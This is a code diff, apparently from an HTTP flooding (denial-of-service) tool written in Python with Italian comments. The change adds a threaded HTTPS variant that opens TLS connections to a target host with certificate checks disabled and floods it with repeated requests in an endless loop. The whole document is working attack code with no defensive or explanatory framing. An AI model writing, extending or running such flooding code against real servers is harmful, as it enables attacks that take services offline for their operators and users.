@@ -1,5 +1,6 @@
 import socket
 import argparse
+import ssl
 import _thread
 import threading
 import random
@@ -535,7 +536,10 @@ def main():
         time.sleep(5)
         for x in range(args.threads):
             request = random.choice(request_list)
-            RequestDefaultHTTP(x + 1).start()
+            if args.ssl:
+                RequestDefaultHTTPS(x + 1).start()
+            else:
+                RequestDefaultHTTP(x + 1).start()
             print ("Thread " + str(x) + " ready!")
         go.set()
 
@@ -562,6 +566,29 @@ class RequestDefaultHTTP(threading.Thread):
             except:
                 s.close()
 
+class RequestDefaultHTTPS(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                # creazione socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(args.host), int(args.port)))
+                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
+                                    ssl_version=ssl.PROTOCOL_SSLv23)
+                s.send(str.encode(request))  # invio
+                print ("Request sent! @", self.counter)
+                try:
+                    for y in range(150):
+                        s.send(str.encode(request))
+                except:
+                    s.close()
+            except:
+                s.close()
 
 class RequestProxyHTTP(threading.Thread):
     def __init__(self, counter):
